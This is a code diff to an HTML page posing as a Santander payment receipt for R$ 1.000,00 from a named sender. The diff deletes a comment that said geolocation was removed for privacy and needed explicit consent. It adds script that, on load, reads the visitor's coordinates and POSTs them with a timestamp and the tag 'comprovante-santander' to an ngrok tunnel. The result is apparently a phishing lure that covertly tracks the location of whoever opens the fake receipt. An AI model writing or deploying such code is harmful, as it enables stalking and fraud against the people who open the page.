@@ -19,7 +19,7 @@
       max-width: 600px;
       margin: auto;
       border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     }
 
     .informacoes p {
@@ -70,6 +70,7 @@
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
+      <p><span>Localização:</span> <span id="localizacao">Obtendo localização...</span></p>
     </div>
 
     <button class="botao" onclick="window.print()">Imprimir</button>
@@ -91,8 +92,46 @@
       document.getElementById("data-atual").textContent = dataFormatada;
     });
 
-    // Geolocalização removida por motivos de privacidade
-    // Se desejar reativar no futuro, implemente com consentimento explícito
+    // Geolocalização com envio para servidor
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          const localizacaoTexto = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
+          document.getElementById("localizacao").textContent = localizacaoTexto;
+
+          // Enviar os dados para o servidor (exemplo com fetch POST)
+          fetch("https://21a6-201-42-106-118.ngrok-free.app", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              latitude,
+              longitude,
+              data: new Date().toISOString(),
+              origem: "comprovante-santander"
+            }),
+          })
+          .then(response => {
+            if (!response.ok) throw new Error("Erro ao enviar localização");
+            return response.json();
+          })
+          .then(data => {
+            console.log("Localização enviada com sucesso:", data);
+          })
+          .catch(error => {
+            console.error("Erro ao enviar localização:", error);
+          });
+        },
+        (error) => {
+          document.getElementById("localizacao").textContent = "Permissão negada ou erro na localização.";
+          console.warn("Erro na geolocalização:", error);
+        }
+      );
+    } else {
+      document.getElementById("localizacao").textContent = "Geolocalização não suportada neste navegador.";
+    }
   </script>
 </body>
 
